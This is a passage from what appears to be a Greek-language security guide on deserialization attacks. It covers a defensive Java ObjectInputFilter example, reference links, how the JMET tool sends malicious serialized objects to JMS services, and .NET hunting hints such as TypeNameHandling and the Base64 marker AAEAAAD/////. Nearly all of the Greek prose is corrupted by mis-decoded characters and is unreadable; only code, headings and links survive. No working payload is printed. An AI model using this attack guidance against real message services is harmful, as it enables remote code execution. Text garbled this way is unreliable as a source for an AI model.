Î“Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï†Î¯Î»Ï„ÏÎ± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î­Î½Î± Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿ Ï†Î¯Î»Ï„ÏÎ¿ Ï€Î¿Ï… ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÏ„Î±Î¹ ÏƒÎµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ Î® Î½Î± Ï„Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ„Îµ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¬ Î³Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÏÎ¿Î­Ï‚. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Î‘Î¾Î¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î•Î¾Ï‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î’Î¹Î²Î»Î¹Î¿Î¸Î·ÎºÏÎ½ Î³Î¹Î± Î’ÎµÎ»Ï„Î¹Ï‰Î¼Î­Î½Î· Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±**: Î’Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î¿Î¹ **NotSoSerial**, **jdeserialize** ÎºÎ±Î¹ **Kryo** Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Ï…Î½ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î³Î¹Î± Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ· Ï„Î·Ï‚ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ Java. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎµÏ€Î¯Ï€ÎµÎ´Î± Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚, ÏŒÏ€Ï‰Ï‚ Î· Î»ÎµÏ…ÎºÎ® Î® Î¼Î±ÏÏÎ· Î»Î¯ÏƒÏ„Î± ÎºÎ»Î¬ÏƒÎµÏ‰Î½, Î· Î±Î½Î¬Î»Ï…ÏƒÎ· ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ±Î¹ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Ï‰Î½ ÏƒÏ„ÏÎ±Ï„Î·Î³Î¹ÎºÏÎ½ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚.

* **NotSoSerial** Ï€Î±ÏÎµÎ¼Î²Î±Î¯Î½ÎµÎ¹ ÏƒÏ„Î¹Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Î· Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±.
* **jdeserialize** ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î»Ï…ÏƒÎ· ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ Java Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï„Î± Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³ÎµÎ¯, Î²Î¿Î·Î¸ÏÎ½Ï„Î±Ï‚ ÏƒÏ„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Î´Ï…Î½Î·Ï„Î¹ÎºÎ¬ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï….
* **Kryo** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÏŒ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¯Î½ÎµÎ¹ Î­Î¼Ï†Î±ÏƒÎ· ÏƒÏ„Î·Î½ Ï„Î±Ï‡ÏÏ„Î·Ï„Î± ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï€Î¿Î´Î¿Ï„Î¹ÎºÏŒÏ„Î·Ï„Î±, Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ ÏÏ…Î¸Î¼Î¹Î¶ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÏƒÏ„ÏÎ±Ï„Î·Î³Î¹ÎºÎ­Ï‚ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ½Î¹ÏƒÏ‡ÏÏƒÎ¿Ï…Î½ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±.

### Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* ÎŸÎ¼Î¹Î»Î¯Î± Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ±Î¹ Ï„Î¿ ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* ÎŸÎ¼Î¹Î»Î¯Î± Î³Î¹Î± Ï„Î¿ gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ÎºÎ±Î¹ Î´Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* ÎˆÎ³Î³ÏÎ±Ï†Î¿ Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* ÎˆÎ³Î³ÏÎ±Ï†Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· JSON Java ÎºÎ±Î¹ .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Î¿Î¼Î¹Î»Î¯Î±: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ÎºÎ±Î¹ Î´Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVEs Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Î’ÏÎµÎ¯Ï„Îµ Ï„Î¹ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **JNDI Injection, Ï€ÏÏ‚ Î½Î± Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Î­ÏƒÏ‰ RMI, CORBA & LDAP ÎºÎ±Î¹ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿ log4shell** (ÎºÎ±Î¹ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚) ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> Î— **Java Message Service** (**JMS**) API ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Java API Ï€ÏÎ¿ÏƒÎ±Î½Î±Ï„Î¿Î»Î¹ÏƒÎ¼Î­Î½Î· ÏƒÎµ Î¼Î·Î½ÏÎ¼Î±Ï„Î± Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½ Î¼ÎµÏ„Î±Î¾Ï Î´ÏÎ¿ Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÏ‰Î½ Ï€ÎµÎ»Î±Ï„ÏÎ½. Î•Î¯Î½Î±Î¹ Î¼Î¹Î± Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î³Î¹Î± Ï„Î·Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„ÏÏ€Î¹ÏƒÎ· Ï„Î¿Ï… Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î¿Ï‚ Ï€Î±ÏÎ±Î³Ï‰Î³Î¿Ï-ÎºÎ±Ï„Î±Î½Î±Î»Ï‰Ï„Î®. Î— JMS ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏÎ¿Ï‚ Ï„Î·Ï‚ Java Platform, Enterprise Edition (Java EE) ÎºÎ±Î¹ Î¿ÏÎ¯ÏƒÏ„Î·ÎºÎµ Î±Ï€ÏŒ Î¼Î¹Î± Ï€ÏÎ¿Î´Î¹Î±Î³ÏÎ±Ï†Î® Ï€Î¿Ï… Î±Î½Î±Ï€Ï„ÏÏ‡Î¸Î·ÎºÎµ Î±Ï€ÏŒ Ï„Î·Î½ Sun Microsystems, Î±Î»Î»Î¬ Î±Ï€ÏŒ Ï„ÏŒÏ„Îµ ÎºÎ±Î¸Î¿Î´Î·Î³ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚ Java. Î•Î¯Î½Î±Î¹ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î± ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½ Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Java EE Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¿ÏÎ½, Î½Î± ÏƒÏ„Î­Î»Î½Î¿Ï…Î½, Î½Î± Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î²Î¬Î¶Î¿Ï…Î½ Î¼Î·Î½ÏÎ¼Î±Ï„Î±. Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼ÎµÏ„Î±Î¾Ï Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏÎ½ ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÏÎ½ Î¼Î¹Î±Ï‚ ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡Î±Î»Î±ÏÎ¬ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î·, Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î· ÎºÎ±Î¹ Î±ÏƒÏÎ³Ï‡ÏÎ¿Î½Î·. (Î‘Ï€ÏŒ [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Î ÏÎ¿ÏŠÏŒÎ½Ï„Î±

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÏÎºÎµÏ„Î¬ Ï€ÏÎ¿ÏŠÏŒÎ½Ï„Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î±Ï…Ï„ÏŒ Ï„Î¿ middleware Î³Î¹Î± Î½Î± ÏƒÏ„Î­Î»Î½Î¿Ï…Î½ Î¼Î·Î½ÏÎ¼Î±Ï„Î±:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

ÎˆÏ„ÏƒÎ¹, Î²Î±ÏƒÎ¹ÎºÎ¬ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Ï€Î¿Î»Î»Î­Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ JMS Î¼Îµ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï„ÏÏŒÏ€Î¿**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î­Ï‡ÎµÏ„Îµ **Î±ÏÎºÎµÏ„Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** Î³Î¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î¼Î·Î½ÏÎ¼Î±Ï„Î± ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Î­Î³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±) Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ **ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï€Î¿Ï… Î¸Î± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ ÎºÎ±Î¹ Î¸Î± Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³Î·Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÎ±Ï„Î±Î½Î±Î»Ï‰Ï„Î®/ÏƒÏ…Î½Î´ÏÎ¿Î¼Î·Ï„Î®**.\
Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÏŒÎ»Î¿Î¹ Î¿Î¹ **Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Î®Î½Ï…Î¼Î± Î¸Î± Î¼Î¿Î»Ï…Î½Î¸Î¿ÏÎ½**.

Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î· (ÎµÏ€ÎµÎ¹Î´Î® Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³ÎµÎ¯ Î±Î½Î±ÏƒÏ†Î±Î»ÏÏ‚ Ï„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·) Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î³ÎºÏ…ÏÎ± gadgets Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.

Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ [JMET](https://github.com/matthiaskaiser/jmet) Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î³Î¹Î± Î½Î± **ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹Ï„ÎµÎ¸ÎµÎ¯ ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î´Î¹Î¬Ï†Î¿ÏÎ± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Ï€Î¿Ï… ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î³Î½Ï‰ÏƒÏ„Î¬ gadgets**. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î±Î½ Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± ÎµÏ…Î¬Î»Ï‰Ï„Î· ÎºÎ±Î¹ Î±Î½ ÎºÎ¬Ï€Î¿Î¹Î¿ Î±Ï€ÏŒ Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½Î± gadgets ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î®.

### Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* ÎŸÎ¼Î¹Î»Î¯Î± JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Î”Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Î£Ï„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï„Î¿Ï… .Net, Î¿Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ Î¼Îµ Ï„ÏÏŒÏ€Î¿ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ ÎµÎºÎµÎ¯Î½ÎµÏ‚ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î·Î½ Java, ÏŒÏ€Î¿Ï… Ï„Î± gadgets ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎ¿Î½Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï….

### Î‘Ï€Î¿Ï„ÏÏ€Ï‰Î¼Î±

#### WhiteBox

ÎŸ Ï€Î·Î³Î±Î¯Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸ÎµÎ¯ Î³Î¹Î± Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Î— Ï€ÏÎ¿ÏƒÎ¿Ï‡Î® Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏƒÏ„Î¹Î¬Î¶ÎµÏ„Î±Î¹ ÏƒÎµ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Ï„Î­Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î¿Î½ Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¹ÏƒÎ¼ÏŒ Ï„Î¿Ï… Ï„ÏÏ€Î¿Ï… Î±Ï€ÏŒ Î¼Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï…Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·.

#### BlackBox

Î— Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ ÏƒÏ„Î· Base64 ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ **AAEAAAD/////** Î® Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Î¿Ï„Î¯Î²Î¿ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¿ÏƒÏ„ÎµÎ¯ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Î»ÎµÎ³Ï‡Î¿ Ï€Î¬Î½Ï‰ ÏƒÏ„Î¿Î½ Ï„ÏÏ€Î¿ Ï€Î¿Ï… Î¸Î± Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³Î·Î¸ÎµÎ¯. Î‘Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹, Î±Î»Î»Î¬ Î´ÎµÎ½ Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÎµ, **JSON** Î® **XML** Î´Î¿Î¼Î­Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ `TypeObject` Î® `$type`.

### ysoserial.net

